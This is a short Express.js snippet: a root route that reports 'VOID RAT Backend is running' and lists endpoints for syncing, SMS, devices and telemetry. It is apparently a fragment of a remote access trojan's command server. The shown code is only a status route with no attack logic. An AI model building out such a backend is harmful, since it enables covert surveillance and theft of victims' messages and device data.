// ─── ROOT ROUTE ───
app.get('/', (req, res) => {
    res.json({
        status: 'VOID RAT Backend is running',
        endpoints: {
            sync: '/api/sync (POST)',
            sms: '/api/sms (GET)',
            devices: '/api/devices (GET)',
            telemetry: '/api/telemetry (GET)'
        },
        timestamp: new Date().toISOString()
    });
});
